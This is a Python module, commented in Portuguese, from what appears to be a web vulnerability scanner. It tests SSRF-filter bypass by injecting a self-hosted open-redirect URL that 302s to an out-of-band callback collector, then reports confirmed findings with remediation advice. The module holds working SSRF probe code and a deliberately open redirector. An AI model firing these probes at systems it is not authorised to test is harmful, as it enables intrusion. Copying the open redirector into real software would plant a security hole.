"""
modules/redirect_chain_ssrf_bypass.py

Testa se um filtro de SSRF (que valida a URL de ENTRADA) pode ser
contornado enviando uma URL de REDIRECT ABERTO que aponta pro destino
bloqueado -- se a aplicacao segue redirect automaticamente (comportamento
padrao de toda biblioteca HTTP client, allow_redirects=True), o filtro
que só validou a URL original nunca vê o destino real.

Reaproveita o MESMO coletor out-of-band de callback_ssrf_heuristic.py
(confirmacao por callback, funciona em SSRF cego) -- a diferenca aqui é
que a URL enviada como payload não é o coletor diretamente, é um
REDIRECIONADOR que o proprio modulo hospeda, que 302 pro coletor. Se o
coletor registrar o hit mesmo assim, prova que o redirect foi seguido
de verdade -- o mesmo destino que um filtro ingenuo (que só olha a URL
de entrada, não a cadeia de redirect inteira) deixaria passar.
"""

from __future__ import annotations

import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, HTTPServer

from utils.requester import get, post
from knowledge.contracts import discovery_module, Requirement, Produces
from knowledge.result import ModuleResult
from modules.callback_ssrf_heuristic import _CallbackCollector, configure_callback_host as _configure_callback_host

_REDIRECT_WAIT_SECONDS = 3.0

_callback_host: str | None = None
_callback_port: int = 0


def configure_callback_host(host: str, port: int = 0) -> None:
    """Mesma configuração de callback_ssrf_heuristic.py -- reaproveita o
    mesmo host/porta, um --callback-host só configura os dois módulos."""
    global _callback_host, _callback_port
    _callback_host = host
    _callback_port = port
    _configure_callback_host(host, port)  # mantém os dois módulos em sincronia


class _OpenRedirector:
    """Servidor HTTP minimo que sempre responde 302 pro destino
    codificado no path -- simula um endpoint de redirect aberto real
    (comum em app com "voltar pra essa URL depois de logar", etc.)."""

    def __init__(self, host: str, port: int):
        handler = self._make_handler()
        self._server = HTTPServer((host, port), handler)
        self.port = self._server.server_address[1]
        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()

    def _make_handler(self):
        class Handler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass

            def do_GET(self):
                from urllib.parse import urlparse, parse_qs, unquote
                qs = parse_qs(urlparse(self.path).query)
                destination = unquote(qs.get("to", [""])[0])
                self.send_response(302)
                self.send_header("Location", destination)
                self.end_headers()

        return Handler

    def build_redirect_url(self, host: str, destination: str) -> str:
        from urllib.parse import quote
        return f"http://{host}:{self.port}/?to={quote(destination, safe='')}"

    def shutdown(self):
        self._server.shutdown()


def _send(url: str, method: str, params: dict):
    if method.upper() == "GET":
        return get(url, params=params)
    return post(url, data=params)


def _hash_from_key(key) -> str:
    return str(key).split(".")[-1]


@discovery_module(
    requires=[
        Requirement("surface.param.*", min_confidence=0.5),
        Requirement("config.callback_host_available", min_confidence=0.5),
    ],
    produces=[],
    cost=3,
    max_reentries=20,
    category="ssrf_generic",
    display_name="Bypass de SSRF via Cadeia de Redirect",
    summary="Envia URL de redirect aberto apontando pro coletor de callback -- confirma se o alvo segue o redirect de verdade, contornando filtro que só valida a URL de entrada.",
)
class RedirectChainSSRFBypass:
    name = "redirect_chain_ssrf_bypass"
    _collector: _CallbackCollector | None = None
    _redirector: _OpenRedirector | None = None

    @classmethod
    def _get_infra(cls):
        if _callback_host is None:
            return None, None
        if cls._collector is None:
            cls._collector = _CallbackCollector(_callback_host, _callback_port)
        if cls._redirector is None:
            cls._redirector = _OpenRedirector(_callback_host, 0)
        return cls._collector, cls._redirector

    def run(self, target, facts_in):
        collector, redirector = self._get_infra()
        if collector is None:
            print("[redirect_chain_ssrf_bypass] nenhum callback host configurado -- módulo não roda "
                  "(ver configure_callback_host()).")
            return None

        params = facts_in.get("surface.param.*", [])
        findings = []

        for f in params:
            info = f.value
            url, method, param = info["url"], info["method"], info["param"]

            token = uuid.uuid4().hex[:16]
            collector_url = f"http://{_callback_host}:{collector.port}/{token}"
            redirect_url = redirector.build_redirect_url(_callback_host, collector_url)

            _send(url, method, {param: redirect_url})
            time.sleep(_REDIRECT_WAIT_SECONDS)

            if collector.was_hit(token):
                findings.append({
                    "title": f"SSRF via bypass de redirect confirmado: parâmetro '{param}' em {url}",
                    "severity": "critical",
                    "module": self.name,
                    "category": "ssrf",
                    "endpoint": url,
                    "description": (
                        f"O parâmetro '{param}' (via {method}), recebendo uma URL de redirect "
                        f"aberto que 302 pro coletor, resultou numa requisição real de volta -- "
                        f"a aplicação seguiu o redirect até o destino final, contornando "
                        f"qualquer filtro que só valide a URL de ENTRADA, não a cadeia inteira."
                    ),
                    "business_impact": (
                        "Filtro de SSRF que só valida a URL fornecida (não a cadeia de redirect "
                        "completa) pode ser contornado com um redirect intermediário -- "
                        "mesmo impacto do SSRF direto, só que evade a proteção existente."
                    ),
                    "remediation": "Desabilitar seguimento automático de redirect na requisição de saída, ou validar CADA hop da cadeia contra a allowlist, não só a URL original.",
                    "evidence": {"url": url, "method": method, "param": param, "callback_token": token, "redirect_via": redirect_url},
                })

        if not findings:
            return None
        return ModuleResult(findings=findings)
